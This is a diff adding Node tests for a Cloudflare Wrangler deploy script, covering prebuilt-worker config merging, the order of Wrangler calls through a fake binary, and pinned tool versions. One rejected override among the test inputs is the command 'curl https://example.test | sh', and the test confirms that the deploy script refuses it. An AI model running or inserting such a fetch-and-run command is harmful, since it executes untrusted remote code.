@@ -27,6 +27,7 @@ import {
 import {
   listProfiles,
   mergeWranglerConfig,
+  prebuiltWranglerConfig,
   resolveWranglerConfig,
   takeProfileArgument,
 } from "../scripts/wrangler-config.mjs";
@@ -493,5 +494,117 @@ if(args[0]==="secret"&&args[1]==="list")console.log(JSON.stringify([
   } finally {
     for(const path of [overlayPath,generatedPath,varsPath])rmSync(path,{force:true});
     rmSync(directory,{recursive:true,force:true});
+  }
+});
+
+/** A directory laid out as scripts/build-prebuilt.mjs writes it. */
+function prebuiltFixture(t) {
+  const dir = mkdtempSync(join(tmpdir(), "agw-prebuilt-"));
+  t.after(() => rmSync(dir, { recursive: true, force: true }));
+  mkdirSync(join(dir, "built/worker"), { recursive: true });
+  mkdirSync(join(dir, "built/console"), { recursive: true });
+  writeFileSync(join(dir, "built/worker/index.js"), "export default {};\n");
+  writeFileSync(join(dir, "built/console/index.html"), "<!doctype html>\n");
+  return dir;
+}
+
+test("a prebuilt deployment deploys the built files unbundled and keeps the rest of the config", (t) => {
+  const dir = prebuiltFixture(t);
+  const base = {
+    name: "app-ai-gateway",
+    main: "src/index.ts",
+    compatibility_date: "2026-09-02",
+    compatibility_flags: ["nodejs_compat"],
+    assets: { directory: "./console/dist", not_found_handling: "single-page-application" },
+    d1_databases: [{ binding: "DB", migrations_dir: "migrations" }],
+  };
+  const merged = mergeWranglerConfig(base, { routes: [{ pattern: "api.example.test", custom_domain: true }] });
+  const config = prebuiltWranglerConfig(base, merged, "built", dir);
+  assert.equal(config.main, join("built", "worker", "index.js"));
+  assert.equal(config.no_bundle, true);
+  assert.deepEqual(config.assets, { directory: join("built", "console"), not_found_handling: "single-page-application" });
+  // Migrations and everything else still come from the checkout and the profile.
+  assert.deepEqual(config.d1_databases, base.d1_databases);
+  assert.deepEqual(config.routes, merged.routes);
+});
+
+test("a prebuilt deployment refuses a profile that changes how the Worker is built", (t) => {
+  const dir = prebuiltFixture(t);
+  const base = { name: "app-ai-gateway", main: "src/index.ts", compatibility_date: "2026-09-02", assets: { directory: "./console/dist" } };
+  // The same value is fine: an overlay may repeat the tracked date.
+  assert.doesNotThrow(() => prebuiltWranglerConfig(base, { ...base, compatibility_date: "2026-09-02" }, "built", dir));
+  for (const change of [
+    { compatibility_date: "2026-10-01" },
+    { compatibility_flags: ["nodejs_compat"] },
+    { build: { command: "curl https://example.test | sh" } },
+    { define: { DEBUG: "true" } },
+  ]) {
+    assert.throws(() => prebuiltWranglerConfig(base, { ...base, ...change }, "built", dir), /decides how the Worker is built/u);
+  }
+  assert.throws(() => prebuiltWranglerConfig(base, base, "missing", dir), /not a prebuilt gateway/u);
+});
+
+test("deploying a prebuilt gateway passes its generated config to every Wrangler call", (t) => {
+  const projectRoot = new URL("..", import.meta.url);
+  const profile = `zz-prebuilt-${process.pid}`;
+  const overlayPath = new URL(`wrangler.${profile}.overlay.jsonc`, projectRoot);
+  const generatedPath = new URL(`wrangler.${profile}.prebuilt.generated.jsonc`, projectRoot);
+  const fixture = prebuiltFixture(t);
+  const fakeWrangler = join(fixture, "wrangler.mjs");
+  const callLog = join(fixture, "calls.ndjson");
+  writeFileSync(
+    fakeWrangler,
+    `#!/usr/bin/env node
+import { appendFileSync } from "node:fs";
+const args = process.argv.slice(2);
+appendFileSync(process.env.FAKE_WRANGLER_LOG, JSON.stringify({ args }) + "\\n");
+if (args[0] === "deployments") console.log("[]");
+if (args[0] === "secret" && args[1] === "list") {
+  console.log(JSON.stringify([{ name: "SECRET_VAULT_LOCAL_KEK_V1" }, { name: "JWT_SECRET" }, { name: "BETTER_AUTH_SECRET" }]));
+}
+`,
+    { mode: 0o700 },
+  );
+  writeFileSync(overlayPath, `{ "workers_dev": false }\n`);
+  t.after(() => {
+    rmSync(overlayPath, { force: true });
+    rmSync(generatedPath, { force: true });
+  });
+
+  const prebuilt = join(fixture, "built");
+  const result = spawnSync(process.execPath, ["scripts/deploy.mjs", "--profile", profile, "--prebuilt", prebuilt], {
+    cwd: projectRoot,
+    encoding: "utf8",
+    env: { ...process.env, APP_AI_GATEWAY_WRANGLER_BIN: fakeWrangler, FAKE_WRANGLER_LOG: callLog, DEPLOYMENT_ID: "deployment-fixture-identity" },
+  });
+  assert.equal(result.status, 0, result.stderr);
+
+  const configArgs = ["--config", fileURLToPath(generatedPath)];
+  const calls = readFileSync(callLog, "utf8").trim().split("\n").map((line) => JSON.parse(line).args);
+  assert.deepEqual(calls, [
+    ["deployments", "list", "--json", ...configArgs],
+    ["secret", "list", "--format", "json", ...configArgs],
+    ["d1", "migrations", "apply", "DB", "--remote", ...configArgs],
+    ["deploy", ...configArgs, "--var", "DEPLOYMENT_ID:deployment-fixture-identity"],
+  ]);
+  const generated = JSON.parse(readFileSync(generatedPath, "utf8").replace(/^\/\/.*$/gmu, ""));
+  assert.equal(generated.no_bundle, true);
+  assert.equal(generated.workers_dev, false);
+  assert.match(generated.main, /built[/\\]worker[/\\]index\.js$/u);
+  assert.equal(generated.d1_databases[0].migrations_dir, "migrations");
+});
+
+test("the deploy job's tools are the versions the repository builds and tests with", () => {
+  const root = new URL("..", import.meta.url);
+  const tools = JSON.parse(readFileSync(new URL("deploy/package.json", root), "utf8")).dependencies;
+  const lock = readFileSync(new URL("pnpm-lock.yaml", root), "utf8");
+  // The root importer of the project's own lockfile document (pnpm writes its
+  // own setup as an earlier document), up to the next importer.
+  const projectLock = lock.slice(lock.lastIndexOf("\nimporters:\n"));
+  const rootImporter = /\n  \.:\n([\s\S]*?)\n  [^\s.][^\n]*:\n/u.exec(projectLock)?.[1] ?? "";
+  for (const name of ["wrangler", "jsonc-parser"]) {
+    const resolved = new RegExp(`\\n      ${name}:\\n        specifier: [^\\n]+\\n        version: ([0-9][^(\\n]*)`, "u").exec(rootImporter)?.[1];
+    assert.ok(resolved, `${name} is not in the root importer of pnpm-lock.yaml`);
+    assert.equal(tools[name], resolved, `deploy/package.json pins ${name} ${tools[name]}, but the repository uses ${resolved}`);
   }
 });
